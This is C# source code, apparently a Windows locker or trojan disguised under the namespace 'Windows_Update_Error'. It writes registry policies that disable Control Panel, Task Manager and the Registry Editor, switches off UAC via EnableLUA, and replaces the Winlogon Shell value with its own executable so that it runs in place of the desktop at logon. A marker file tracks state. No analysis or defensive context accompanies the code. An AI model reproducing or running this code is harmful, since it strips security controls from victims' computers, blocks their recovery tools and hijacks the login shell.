using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Windows_Update_Error
{
    internal class Regedit_Set
    {
        public void Disable_Settings()
        {
            RegistryKey key = Registry.CurrentUser;
            RegistryKey software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            software.SetValue("NoControlPanel", 1);
            software=key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            software.SetValue("DisableTaskMgr",1);
            software.Close();
            key.Close();
        }
        public void Disable_Regedit()
        {
            RegistryKey key = Registry.CurrentUser;
            RegistryKey software = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System",true);
            if (software == null)
            {
                software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            software.SetValue("DisableRegistryTools", 1);
            software.Close();
            key.Close();
        }
        public void Start_Update(string a)
        {
            try
            {
                File.WriteAllText("Error_m1.txt",a, Encoding.UTF8);
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public string Start_Detection()
        {
            string path = "Error_m1.txt";
            FileInfo fileInfo = new FileInfo(path);
            if(fileInfo.Exists==false)
            {
                File.WriteAllText(path,"114514",Encoding.UTF8);
            }
            StreamReader sr = new StreamReader(path,Encoding.UTF8);
            string read=sr.ReadToEnd();
            sr.Close();
            return read;
        }
        public void UAC_OFF()
        {
            RegistryKey key = Registry.LocalMachine;
            RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",true);
            if (software == null) 
            {
                software=key.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            software.SetValue("EnableLUA", 0);
            software.Close();
            key.Close();
        }
        public void PC_Start()
        {
            try
            {
                string local_1 = Process.GetCurrentProcess().MainModule.FileName;
                RegistryKey key = Registry.LocalMachine;
                RegistryKey software=key.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                if (software == null) 
                {
                    software=key.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                }
                software.SetValue("Shell", local_1);
                software.Close();
                key.Close ();
            }
            catch(Exception ex) 
            { 
                MessageBox.Show(ex.Message);
            }
        }
    }
}
